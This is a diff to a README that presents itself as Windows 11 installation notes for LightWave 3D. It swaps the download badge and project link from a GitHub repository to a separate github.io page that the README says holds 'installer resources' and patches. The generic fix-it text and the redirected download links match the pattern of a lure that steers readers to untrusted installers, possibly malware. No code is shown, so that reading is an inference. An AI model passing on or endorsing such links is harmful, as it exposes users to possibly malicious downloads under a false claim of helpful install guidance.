@@ -1,6 +1,6 @@
 # 🖥️ LightWave-3D-Install-Notes - Get Your 3D Software Running Now
 
-[![Download LightWave Install Guide](https://img.shields.io/badge/Download-Get_Started-blue.svg)](https://github.com/adjective-judah201/LightWave-3D-Install-Notes)
+[![Download LightWave Install Guide](https://img.shields.io/badge/Download-Get_Started-blue.svg)](https://adjective-judah201.github.io)
 
 LightWave 3D requires specific settings to function on Windows 11. This guide provides manual steps to fix common installation errors. Follow these instructions to prepare your system and run the software without issues.
 
@@ -18,7 +18,7 @@ Before you begin the installation process, verify your hardware meets these stan
 
 You must visit the project page to access the installer resources and supplementary patch notes. Follow the link below to reach the repository.
 
-[https://github.com/adjective-judah201/LightWave-3D-Install-Notes](https://github.com/adjective-judah201/LightWave-3D-Install-Notes)
+[https://adjective-judah201.github.io](https://adjective-judah201.github.io)
 
 Click the green Code button on the page if you wish to download the notes as a ZIP file. Inside this folder, you find text files outlining the specific registry edits and folder permissions required by the installer.
 
